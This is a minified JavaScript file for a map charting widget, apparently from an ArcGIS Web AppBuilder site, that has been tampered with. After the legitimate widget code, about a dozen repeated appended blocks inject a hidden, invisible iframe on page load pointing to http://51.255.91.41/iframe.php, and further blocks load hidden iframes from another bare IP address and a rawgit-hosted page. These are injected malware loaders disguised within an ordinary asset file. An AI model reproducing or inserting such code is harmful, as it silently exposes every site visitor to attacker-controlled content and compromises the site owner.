b.getUrl())}}))},_rebuildFilter:function(a,b){try{if(b){delete b.expr;var c=new y;c.isHosted=l.isHostedService(a);c.getExprByFilterObj(b)}}catch(x){console.log(x)}},postCreate:function(){this.inherited(arguments);l.combineRadioCheckBoxWithLabel(this.cbxUseSpatial,this.labelUseSpatial);l.combineRadioCheckBoxWithLabel(this.cbxUseMapExtent,this.labelUseMapExtent);l.combineRadioCheckBoxWithLabel(this.cbxDrawGraphic,this.labelDrawGraphic);this._initDrawBox();this._initPreview();this._initSelf()},onOpen:function(){this.tempResultLayer&&
this.tempResultLayer.show()},onDeActive:function(){this.drawBox.deactivate()},onClose:function(){this.tempResultLayer&&this.tempResultLayer.hide();this._hideInfoWindow();this.drawBox.clear();this.inherited(arguments)},resize:function(){var a="BoxTheme"===this.appConfig.theme.name?1100:100;setTimeout(g.hitch(this,function(){this._updatePreviewHeight();this.preview.resize()}),a)},destroy:function(){this._clickClearButton(!0);this.inherited(arguments)},_isConfigValid:function(){return this.config&&"object"===
typeof this.config},_initDrawBox:function(){this.drawBox=new e({types:["point","polyline","polygon"],map:this.map,showClear:!0,keepOneGraphic:!0});this.drawBox.placeAt(this.drawBoxDiv);this.drawBox.startup()},_createBigPreview:function(){if(this.previewArgs){var a=document.body.clientWidth-40,b=document.body.clientHeight-40;if(!(100>a||100>b)){var c=this._getDefaultFontColor(),d=0;this.preview&&0<=this.preview.currentChartIndex&&(d=this.preview.currentChartIndex);var e=new r({map:this.map,fontColor:c,
isBigPreview:!0,showSettingIcon:!0,showZoomIcon:!1,zoomToFeaturesWhenClick:!0,initialChartIndex:d,style:"width:100%;height:100%;"});this.previewPopup=new A({width:a,height:b,titleLabel:this.nls._widgetLabel,content:e,onClose:g.hitch(this,function(){e.destroy();this.previewPopup=e=null})});setTimeout(g.hitch(this,function(){e.createClientCharts(this.preview.featureLayer,this.preview.features,this.preview.config)}),100)}}},_initPreview:function(){var a=this._getDefaultFontColor();this.preview=new r({map:this.map,
fontColor:a,isBigPreview:!1,showSettingIcon:!0,showZoomIcon:!0,zoomToFeaturesWhenClick:!0});this.preview.placeAt(this.resultsContainer);this.preview.startup();this.own(h(this.preview,"zoomin",g.hitch(this,this._createBigPreview)))},_getDefaultFontColor:function(){var a="#333333";"DashboardTheme"!==this.appConfig.theme.name||"default"!==this.appConfig.theme.styles[0]&&"style3"!==this.appConfig.theme.styles[0]?"DartTheme"===this.appConfig.theme.name&&(a="#fff"):a="#fff";return a},_initSelf:function(){var c=
"Chart_"+l.getRandomString();this.cbxUseMapExtent.name=c;this.cbxDrawGraphic.name=c;(this.isValidConfig=this._isConfigValid())?(c=this.config.charts,0===c.length?(b.setStyle(this.chartsNode,"display","none"),b.setStyle(this.noChartTipSection,"display","block")):a.forEach(c,g.hitch(this,function(a,c){var d=a.name,f=b.toDom('\x3ctr class\x3d"single-chart jimu-table-row"\x3e\x3ctd class\x3d"first-td"\x3e\x3c/td\x3e\x3ctd class\x3d"second-td"\x3e\x3cdiv class\x3d"chart-name-div"\x3e\x3c/div\x3e\x3c/td\x3e\x3ctd class\x3d"third-td"\x3e\x3cdiv class\x3d"arrow"\x3e\x3c/div\x3e\x3c/td\x3e\x3c/tr\x3e');
n(".chart-name-div",f)[0].innerHTML=l.stripHTML(d);b.place(f,this.chartsTbody);f.singleConfig=a;0===c%2?b.addClass(f,"even"):b.addClass(f,"odd")}))):(b.setStyle(this.chartsNode,"display","none"),b.setStyle(this.invalidConfigNode,{display:"block",left:0}))},_clickClearButton:function(a){this._hideInfoWindow();this.drawBox.clear();this._removeTempResultLayer();this._clearResultPage();a||this._fromCurrentPageToChartList()},_slide:function(a,c,f){b.setStyle(a,"display","block");b.setStyle(a,"left",c+
"%");d.animateProperty({node:a,properties:{left:{start:c,end:f,units:"%"}},duration:500,onEnd:g.hitch(this,function(){b.setStyle(a,"left",f);0===f?b.setStyle(a,"display","block"):b.setStyle(a,"display","none")})}).play()},_onChartListClicked:function(a){if(a=l.getAncestorDom(a.target||a.srcElement,g.hitch(this,function(a){return b.hasClass(a,"single-chart")}),10)){var c=a.singleConfig;this._resetCurrentAttrs();this.currentAttrs.chartTr=a;this.currentAttrs.config=g.clone(c);this.currentAttrs.layerInfo=
this.currentAttrs.chartTr.layerInfo;n("tr.single-chart",this.chartsTbody).removeClass("jimu-state-active");b.addClass(this.currentAttrs.chartTr,"jimu-state-active");var d=g.hitch(this,function(){this.currentAttrs.layerInfo=this.currentAttrs.chartTr.layerInfo;this._fromChartListToChartParams()});this.currentAttrs.chartTr.layerInfo?d():(a=this.currentAttrs.config.url,this.shelter.show(),B({url:a,content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(g.hitch(this,function(a){this.domNode&&
(this.shelter.hide(),this.currentAttrs.chartTr.layerInfo=a,this.currentAttrs.layerInfo=this.currentAttrs.chartTr.layerInfo,d())}),g.hitch(this,function(a){console.error(a);if(this.domNode){this.shelter.hide();var b="";a&&403===a.httpCode&&(b=this.nls.noPermissionsMsg);this._showQueryErrorMsg(b)}})))}},_fromCurrentPageToChartList:function(){b.setStyle(this.chartList,"display","block");"block"===b.getStyle(this.chartParams,"display")?(this._slide(this.chartList,-100,0),this._slide(this.chartParams,
0,100)):"block"===b.getStyle(this.chartResults,"display")&&(this._slide(this.chartList,-100,0),this._slide(this.chartResults,0,100))},_onCbxUseSpatialClicked:function(){this.cbxUseSpatial.checked?b.setStyle(this.selectSpatialDiv,"display","block"):b.setStyle(this.selectSpatialDiv,"display","none");this.cbxUseMapExtent.checked?this._onCbxUseMapExtentClicked():this._onCbxDrawGraphicClicked();this._resetDrawBox()},_onCbxUseMapExtentClicked:function(){this.cbxUseMapExtent.checked&&(this._resetDrawBox(),
b.setStyle(this.drawBoxDiv,"display","none"))},_onCbxDrawGraphicClicked:function(){this.cbxDrawGraphic.checked&&b.setStyle(this.drawBoxDiv,"display","block")},_onBtnClearAllClicked:function(){0!==this.chartsTbody.childElementCount&&this._clickClearButton("none"!==this.chartList.style.display)},_resetDrawBox:function(){this.drawBox.deactivate();this.drawBox.clear()},_resetChartParamsPage:function(){this.cbxUseSpatial.checked=!1;this._onCbxUseSpatialClicked();this._resetDrawBox()},_fromChartListToChartParams:function(){this._resetChartParamsPage();
var a=this.chartParams,c=this.chartResults;b.setStyle(this.chartList,{left:0,display:"block"});b.setStyle(a,{left:"100%",display:"block"});b.setStyle(c,"display","none");this._slide(this.chartList,0,-100);this._slide(a,100,0)},_onBtnParamsBackClicked:function(){this._resetDrawBox();b.setStyle(this.chartList,"display","block");b.setStyle(this.chartParams,"display","block");b.setStyle(this.chartResults,"display","none");this._slide(this.chartList,-100,0);this._slide(this.chartParams,0,100)},_onBtnApplyClicked:function(){this._clearResultPage();
var d=this.currentAttrs.config.filter.expr,e=null;if(this.cbxUseSpatial.checked){if(this.cbxUseMapExtent.checked)e=this.map.extent;else{var f=this.drawBox.drawLayer.graphics;0<f.length&&(e=f[0].geometry)}if(!e){new c({message:this.nls.specifySpatialFilterMsg});return}}this.tempResultLayer&&this.map.removeLayer(this.tempResultLayer);this.tempResultLayer=null;this._createChartResultLayer();this._resetDrawBox();b.setStyle(this.chartList,"display","none");b.setStyle(this.chartParams,"display","block");
b.setStyle(this.chartResults,"display","block");this._slide(this.chartParams,0,-100);this._slide(this.chartResults,100,0);var h=this.currentAttrs.config,f=[],k=h.mode;"feature"===k?(f=g.clone(h.valueFields),0>f.indexOf(h.labelField)&&f.push(h.labelField)):"category"===k?(f=g.clone(h.valueFields),0>f.indexOf(h.categoryField)&&f.push(h.categoryField)):"count"===k?f=[h.categoryField]:"field"===k&&(f=g.clone(h.valueFields));this.shelter.show();(k=this._getBaseExpression(this.currentAttrs.config.webMapLayerId))&&
(d="("+k+") AND ("+d+")");this._query(d,f,e).then(g.hitch(this,function(b){if(this.domNode&&(this.shelter.hide(),0<b.status)){var c={featureLayer:this.tempResultLayer,features:b.features,config:h};this.previewArgs=c;this._updatePreviewHeight();this.preview.createClientCharts(c.featureLayer,c.features,c.config);a.forEach(b.features,g.hitch(this,function(a){var b=a.geometry;"point"===b.type?l.isVaildPointGeometry(b)&&this.tempResultLayer.add(a):this.tempResultLayer.add(a)}));this._zoomToLayer(this.tempResultLayer)}}),
g.hitch(this,function(a){console.error(a);this.domNode&&(this.shelter.hide(),this._removeTempResultLayer())}))},_getBaseExpression:function(a){var b="";if(a){var c=null;(c="Table"===this.currentAttrs.layerInfo.type?this.layerInfosObj.getTableInfoById(a):this.layerInfosObj.getLayerInfoById(a))&&(b=c.getFilter())}return b},_updatePreviewHeight:function(){var a=b.getContentBox(this.domNode);b.setStyle(this.preview.domNode,"height",Math.max(a.h-120,150)+"px")},_createChartResultLayer:function(){this._removeTempResultLayer();
var a=g.clone(this.currentAttrs.layerInfo);a.drawingInfo||(a.drawingInfo={});a.drawingInfo.transparency=0;a.minScale=0;a.maxScale=0;a.effectiveMinScale=0;a.effectiveMaxScale=0;a.defaultVisibility=!0;delete a.extent;this.tempResultLayer=new v({layerDefinition:a,featureSet:null});this.map.addLayer(this.tempResultLayer);a=D.fromJson(this.currentAttrs.config.symbol);a=new p(a);this.tempResultLayer.setRenderer(a)},_removeTempResultLayer:function(){this.tempResultLayer&&this.map.removeLayer(this.tempResultLayer);
this.tempResultLayer=null},_query:function(a,b,c){a||(a="1\x3d1");var d={};d.url=this.currentAttrs.config.url;d.layerInfo=this.currentAttrs.layerInfo;d.limit=1E4;d.spatialReference=this.map.spatialReference;d.where=a;d.geometry=c;d.outFields=b;return(new u(d)).getFeatures()},_clearResultPage:function(){this.previewPopup&&(this.previewPopup.close(),this.previewPopup=null);this.previewArgs=null;this.preview.clear();this._hideInfoWindow()},_zoomToLayer:function(a){var b;a.graphics&&0<a.graphics.length&&
(b=a.graphics.filter(function(a){a=a.geometry;return"point"!==a.type?!0:l.isVaildPointGeometry(a)}.bind(this)));if(b&&0<b.length){a=null;try{a=w.graphicsExtent(b)}catch(f){console.error(f)}l.isVaildExtent(a)&&this.map.setExtent(a.expand(1.4))}},_showQueryErrorMsg:function(a){new c({message:a||this.nls.queryError})},_hideInfoWindow:function(){},_onBtnResultsBackClicked:function(){var a;a=this.chartParams;b.setStyle(this.chartList,"display","none");b.setStyle(a,{display:"block",left:"-100%"});this._slide(a,
-100,0);this._slide(this.chartResults,0,100)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});